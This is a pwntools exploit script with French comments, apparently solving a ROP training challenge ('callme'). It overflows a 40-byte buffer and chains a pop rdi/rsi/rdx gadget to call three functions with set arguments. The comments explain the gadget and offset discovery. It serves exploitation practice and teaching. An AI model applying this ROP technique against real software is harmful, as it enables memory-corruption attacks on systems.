from pwn import *

# But de la ROP chain :
# 1) Appeler callme_one()
# 2) Appeler callme_two()
# 3) Appeler callme_three()

# Et chaque fonction doit être appelée avec des arguments donnés :

arg_1 = p64(0xdeadbeefdeadbeef)
arg_2 = p64(0xcafebabecafebabe)
arg_3 = p64(0xd00df00dd00df00d)

context.bits = 64

callme_one = p64(0x400720)
callme_two = p64(0x400740)
callme_three = p64(0x4006f0)
# On a aussi l'information que les trois registres utilisés sont EDX, ESI et EDI :
#
#    gdb-peda$ disass usefulFunction
#    [...]
#    0x00000000004008f6 <+4>:     mov    edx,0x6
#    0x00000000004008fb <+9>:     mov    esi,0x5
#    0x0000000000400900 <+14>:    mov    edi,0x4
#    0x0000000000400905 <+19>:    call   0x4006f0 <callme_three@plt>
#    [...]

pop_registres = p64(0x40093c)
# ROPgadget --binary ./callme | grep "pop rdi"
# => 0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret

payload = b'A' * 40 + pop_registres + arg_1 + arg_2 + arg_3 + callme_one
payload += pop_registres + arg_1 + arg_2 + arg_3 + callme_two
payload += pop_registres + arg_1 + arg_2 + arg_3 + callme_three

# Les arguments doivent être empilés juste après le gadget pour qu'ils soient chargés correctement dans les registres avant l'exécution des fonctions

# Obtention du 40 :
#    msf-pattern_create -l 500
#    gdb-peda$ run < cyclic500.txt
#    gdb-peda$ bt
#    msf-pattern_offset -q 0x35624134 -l 500

p = process("./callme")

p.send(payload)
p.interactive()
